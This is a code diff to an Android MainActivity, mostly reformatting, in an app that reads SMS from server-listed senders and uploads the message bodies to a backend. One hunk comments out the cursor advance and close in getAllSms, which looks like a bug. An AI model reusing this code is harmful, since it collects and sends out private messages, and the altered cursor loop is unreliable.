@@ -137,7 +137,7 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    public void setInitFrag()  {
+    public void setInitFrag() {
         searchRawDataFragment = SearchRawDataFragment.newInstance(nums);
         getSupportFragmentManager().beginTransaction().replace(R.id.container, searchRawDataFragment, "SEARCH_RAW_DATA").addToBackStack("SEARCH_RAW_DATA").commit();
         binding.btnSearchRawData.setEnabled(false);
@@ -153,7 +153,7 @@ public class MainActivity extends AppCompatActivity {
     public void switchContent(Fragment fragment, String tag) {
         FragmentManager fm = getSupportFragmentManager();
 
-        JSLog.D("back stack cnt:" + fm.getBackStackEntryCount(),new Throwable());
+        JSLog.D("back stack cnt:" + fm.getBackStackEntryCount(), new Throwable());
 
         boolean fragmentPopped = fm.popBackStackImmediate(tag, 0);
 
@@ -168,18 +168,14 @@ public class MainActivity extends AppCompatActivity {
 
     @Override
     public void onBackPressed() {
-        if (getSupportFragmentManager().getBackStackEntryCount() == 1){
+        if (getSupportFragmentManager().getBackStackEntryCount() == 1) {
             finish();
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN)
-            {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
                 MainActivity.this.finishAffinity();
-            }
-            else
-            {
+            } else {
                 System.exit(0);
             }
-        }
-        else {
+        } else {
             super.onBackPressed();
         }
     }
@@ -195,8 +191,8 @@ public class MainActivity extends AppCompatActivity {
         public void onBackStackChanged() {
             String currentTab = getSupportFragmentManager().findFragmentById(R.id.container).getTag();
             JSLog.D(currentTab, new Throwable());
-            if(currentTab==null) return;
-            switch(currentTab){
+            if (currentTab == null) return;
+            switch (currentTab) {
                 case "SEARCH_RAW_DATA":
                     initNaviButton(binding.btnSearchRawData);
                     break;
@@ -263,7 +259,7 @@ public class MainActivity extends AppCompatActivity {
 
                     JsonArray message = jsonObject.get("message").getAsJsonArray();
                     JsonObject messageObj;
-                    for (int i=0; i<message.size(); i++) {
+                    for (int i = 0; i < message.size(); i++) {
                         messageObj = message.get(i).getAsJsonObject();
                         if (DeviceUtil.getDevicePhoneNumber(MainActivity.this).equals(messageObj.get("phone_num").getAsString())) {
                             nums.add(messageObj.get("sender_num").getAsString());
@@ -273,10 +269,12 @@ public class MainActivity extends AppCompatActivity {
 //                    setRegisterNumAdapter(nums);
 
 
-                    for (int i=0; i<nums.size(); i++) {
+                    for (int i = 0; i < nums.size(); i++) {
                         lst2 = getAllSms(nums.get(i));
                         Log.d(TAG, "lst2.size           :::     " + lst2.size());
-                        uploadSmsBody(nums.get(i).toString(), lst2);
+                        if (lst2.size() > 0) {
+                            uploadSmsBody(nums.get(i).toString(), lst2);
+                        }
                     }
 
 
@@ -445,13 +443,13 @@ public class MainActivity extends AppCompatActivity {
                 if (phoneNum.equals(c.getString(c.getColumnIndexOrThrow("address")))) {
                     lstSms.add(objSms);
                 }
-                c.moveToNext();
+//                c.moveToNext();
             }
         }
         // else {
         // throw new RuntimeException("You have no SMS");
         // }
-        c.close();
+//        c.close();
 
         return lstSms;
     }
@@ -459,8 +457,11 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onDestroy() {
         super.onDestroy();
-//        if (!c.isClosed()) {
-//            c.close();
-//        }
+        if (c != null) {
+            if (!c.isClosed()) {
+                c.close();
+            }
+
+        }
     }
 }
